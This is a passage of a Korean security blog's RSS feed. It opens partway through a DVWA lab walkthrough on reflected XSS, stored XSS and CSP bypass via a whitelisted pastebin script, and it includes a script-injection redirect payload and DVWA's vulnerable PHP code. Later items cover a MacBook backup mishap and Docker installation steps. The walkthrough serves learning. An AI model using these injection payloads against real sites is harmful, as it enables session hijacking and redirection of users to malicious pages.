세션 탈취 등의 행위를 수행할 수 있게됩니다.</p><img src="/img/post/dvwa/reflectxss.png" class="lazyload" data-srcset="/img/post/dvwa/reflectxss.png" srcset="data:image/png;base64,666"><p>페이지를 보면 DOM Based 기법을 볼 때랑 크게 다르지 않습니다.</p><p>사용자로부터 입력값을 받아서 브라우저에 출력시켜주고 있는데, name이라는 변수를 사용합니다.</p><p>이 때, name 변수에 script 호출을 시켜준다면 실행이 될 것입니다.</p><p><code> ?name=<script>location.href='<a href="https://www.naver.com&/#39;">https://www.naver.com&#39;</a>;</script> </code></p><p>해당 코드르 입력값으로 넣어주면 네이버로 페이지가 이동하게 되죠. 이런 점을 이용하여 공격자의 URL로 리다이렉트 시켜서</p><p>악성 스크립트를 실행하거나 파일을 내려받는 등의 침투 시나리오까지 생각해볼 수 있습니다.</p><hr><h3 id="Reflect-XSS-대응-방안"><a href="#Reflect-XSS-대응-방안" class="headerlink" title="Reflect XSS (대응 방안)"></a>Reflect XSS (대응 방안)</h3><ol><li>HTML 입력값 필터링(php 기준, htmlspecialchars 등의 함수를 사용)</li></ol><hr><h3 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h3><img src="/img/post/dvwa/storedxss.png" class="lazyload" data-srcset="/img/post/dvwa/storedxss.png" srcset="data:image/png;base64,666"><p>XSS 기법중 Stored XSS는 웹 사이트 게시판 등에 스크립트를 작성하는 방식의 공격입니다.</p><p>다른 사용자가 본인의 게시글을 읽을 수 있는 곳에 script 태그를 호출하게 만들면,</p><p>본인의 게시글을 읽을 때 스크립트가 실행되게 되는 것입니다.</p><p>공격 방법은 이전과 동일한 방식으로 갈 수 있기 때문에 생략하겠습니다 ^^.</p><hr><h3 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a>CSP Bypass</h3><p>CSP는 Content Security Policy의 약어로 브라우저 콘텐츠 보호 정책입니다.</p><ul><li><a href="https://developers.google.com/web/fundamentals/security/csp?hl=ko">https://developers.google.com/web/fundamentals/security/csp?hl=ko</a></li></ul><p>사이트 내 CSP를 설정하게 되면 허용한 태그 또는 도메인이 아닐 경우 모든 인라인 스크립트 실행을 차단하는 보호 기법이죠.</p><p>만약, CSP를 잘못 설정하거나 올바르지 않은 방법으로 사용했을 때는 XSS 공격 같은 유형이 실행되겠죠?</p><pre><code class="php">&lt;?php$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics.header($headerCSP);# These might work if you can&#39;t create your own for some reason# https://pastebin.com/raw/R570EE00# https://hastebin.com/raw/ohulaquzex?&gt;&lt;?phpif (isset ($_POST[&#39;include&#39;])) &#123;$page[ &#39;body&#39; ] .= &quot;    &lt;script src=&#39;&quot; . $_POST[&#39;include&#39;] . &quot;&#39;&gt;&lt;/script&gt;&quot;;&#125;$page[ &#39;body&#39; ] .= &#39;&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;&lt;/form&gt;&#39;;</code></pre><p>코드를 분석해보면 아래 부분에 CSP가 있음을 확인할 수 있습니다.</p><pre><code class="php">$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from </code></pre><p>우선, script-src의 출처로 pastebin, hastebin, example, code.jquery, ssl-google~~ 등을 허용하고 있습니다.</p><p>해당 도메인으로 오는 스크립트 요청은 허용하겠다는 의미이죠.</p><p>그런데 pastebin을 허용해뒀네요, pastebin은 클립보드 같은 개념의 공유 서비스인데 여기에 스크립트 태그를 호출시키도록 작성하고</p><p>페이지에 로드시키면 스크립트가 실행될 것입니다.</p><p><a href="https://pastebin.com/raw/WB8N2xSY">https://pastebin.com/raw/WB8N2xSY</a></p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/">https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Web/">Web</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Pentesting/">Pentesting</category>
      
      <category domain="https://blog.jhyeon.dev/tags/DVWA/">DVWA</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/19/dvwa-review-210119/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Mac Big Sur 사용 후기 및 백업의 중요성..</title>
      <link>https://blog.jhyeon.dev/2021/01/18/memo-210118/</link>
      <guid>https://blog.jhyeon.dev/2021/01/18/memo-210118/</guid>
      <pubDate>Sun, 17 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;불과 며칠 전 내 소중한 맥북이 의도치 않은 물리적 파손으로 서비스 센터에 다녀왔다.&lt;/p&gt;
&lt;p&gt;큰 고장은 아니였으나 제일 많이 사용하는 키패드 일부가 파손되서 눈물을 흘리면서 수리를 받아야 겠구나 생각했다.&lt;/p&gt;
&lt;p&gt;그 때 센터 가는김에 </description>
        
      
      
      
      <content:encoded><![CDATA[<p>불과 며칠 전 내 소중한 맥북이 의도치 않은 물리적 파손으로 서비스 센터에 다녀왔다.</p><p>큰 고장은 아니였으나 제일 많이 사용하는 키패드 일부가 파손되서 눈물을 흘리면서 수리를 받아야 겠구나 생각했다.</p><p>그 때 센터 가는김에 시스템 포맷도 한번 해야 겠다고 문득 생각이 들었다. (왜냐.. Big Sur의 고질적 오류)</p><p>맥에서 Big Sur 운영체제가 출시된지 1달?2달 된거같은데 초반기에 “최신버전이 그래도 최고지” 라는 안일한 생각에 업데이트를 했다가</p><p>잦은 오류로 인해 엄청난 고생을 했던 경험이 있다.</p><p>그런데 왠걸, 애플에서 빅서 잡 오류를 고친 11.0.2 버전을 내놓았다. 여기서 또 나는 혹해서 이번엔 고쳐졌겠지 라는 두번째 안일한 생각과,</p><p>주변 사람들이 대부분 고쳐진 것 같은데 라는 의견을 수렴해 또 다시 돌아오지 못할 업데이트 길을 걷고 말았다.</p><p>기쁜 마음으로 새 운영체제를 맞이한 순간 초반에 나를 반겨준 오류들은 고쳐진 것 같으나 다양한 오류들이 아직 남아있었다.</p><p>(페럴 네트워크 오류, 키 입력 문제 등..) 작동해야 할 것들이 안하니깐 슬슬 또 화가 나기 시작했고</p><p>이번에는 새로운 버그인가 싶은 간헐적인 버벅임(랙) 현상이 있었다.</p><p>이런 여러가지 계기를 통해서 수리를 받으러 가면서 포맷도 맡겨버릴려고 중요 문서나 파일들은 클라우드에 백업을 해둔 뒤,</p><p>클라우드 저장소에 폴더만 올라간 것을 확인하고 바로 서비스 센터로 가버렸다. (이 때.. 폴더안에 내용들을 확인했어야 하는데..)</p><p>서비스 맡기니깐 키보드 쪽은 가위식 키보드라서 키캡 부분에 약간 문제가 있는거라 금방 수리된다고 전달 받았고 포맷이 1-2일 정도 걸린다고 하셨다.</p><p>맡기고 나와서 한 1시간쯤 뒤인가 생각보다 포맷이 빨리되서 찾으러 오셔도 된다고 전화가 왔고.. 근처 일보고 있었다가 점심시간 거쳐서 찾으러 갔다.</p><p>그렇게 깔끔하게 포맷된 맥북을 가지고 처음부터 다시 환경 세팅을 하면서 백업 파일도 보는데..</p><p>충격스럽게도 클라우드에 올라간 파일들이 폴더만 올라갔고 안에 내용들이 네트워크 오류로 인해서 하나도 안올라갔던 것이였다.</p><p>사태의 심각성을 깨닫고 최신 백업은 아니지만 예전에 다른곳에 백업해둔 파일을 찾아서 하나씩 복구는 했지만</p><p>최근에 씩 엎고 새로 만든 “블로그” 파일이 전부 날아가서 멘붕이 왔다.</p><p>그래도 블로그에 올라간 포스트들은 github에 public 버전으로 업데이트가 되어있었기에 그나마(?) 다행이라고 생각했다.</p><p>결국 블로그 설정 처음부터 다시하면서 업로드한 포스트들 다 git으로 내려받아서 내용 하나하나 수동 복구를 했다 ^^.</p><p>약 3시간 정도 걸린 것 같은데 삽질도 이런 삽질이 없던 것 같다.</p><h3 id="교훈"><a href="#교훈" class="headerlink" title="교훈"></a>교훈</h3><ul><li><p>백업은 항상 끝까지 잘 확인하자</p></li><li><p>이중 백업도 필수 (이거 안했으면 진짜로 망했다)</p></li><li><p>깃허브가 나를 살렸다</p></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Memo/">Memo</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Big-Sur/">Big Sur</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Mac-OS/">Mac OS</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Backup/">Backup</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/18/memo-210118/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2021년 IT/보안 분야 전망/동향 자료</title>
      <link>https://blog.jhyeon.dev/2021/01/12/newit-210112/</link>
      <guid>https://blog.jhyeon.dev/2021/01/12/newit-210112/</guid>
      <pubDate>Mon, 11 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;해당 포스트는 노션으로 이전되었습니다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.notion.so/jhyeon/2021-IT-6c25400797494e7f9c49640675cf6d53&quot;&gt;https://www.notion.so/jhyeon</description>
        
      
      
      
      <content:encoded><![CDATA[<p>해당 포스트는 노션으로 이전되었습니다.</p><p><a href="https://www.notion.so/jhyeon/2021-IT-6c25400797494e7f9c49640675cf6d53">https://www.notion.so/jhyeon/2021-IT-6c25400797494e7f9c49640675cf6d53</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/">정보보안</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%EC%B5%9C%EC%8B%A0%EB%8F%99%ED%96%A5/">최신동향</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/12/newit-210112/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Ubuntu 20.04 Docker Installation</title>
      <link>https://blog.jhyeon.dev/2021/01/08/docker-install-210108/</link>
      <guid>https://blog.jhyeon.dev/2021/01/08/docker-install-210108/</guid>
      <pubDate>Thu, 07 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Step-1&quot;&gt;&lt;a href=&quot;#Step-1&quot; class=&quot;headerlink&quot; title=&quot;Step 1&quot;&gt;&lt;/a&gt;Step 1&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;우분투 패키지 업데이트를 진행합니다.&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><ul><li>우분투 패키지 업데이트를 진행합니다.</li></ul><pre><code class="bash">sudo apt update</code></pre><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><ul><li>도커 필수 라이브러리를 설치합니다.</li></ul><pre><code class="bash">sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</code></pre><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><ul><li>GPG KEY 등록</li></ul><pre><code class="bash">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</code></pre><h3 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h3><ul><li>Repositry 생성</li></ul><pre><code class="bash">sudo add-apt-repository \&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \$(lsb_release -cs) \stable&quot;</code></pre><h3 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h3><ul><li>도커 설치</li></ul><pre><code class="bash">sudo apt updatesudo apt install dockersudo apt install docker-compose</code></pre>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Docker/">Docker</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Ubuntu/">Ubuntu</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/08/docker-install-210108/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
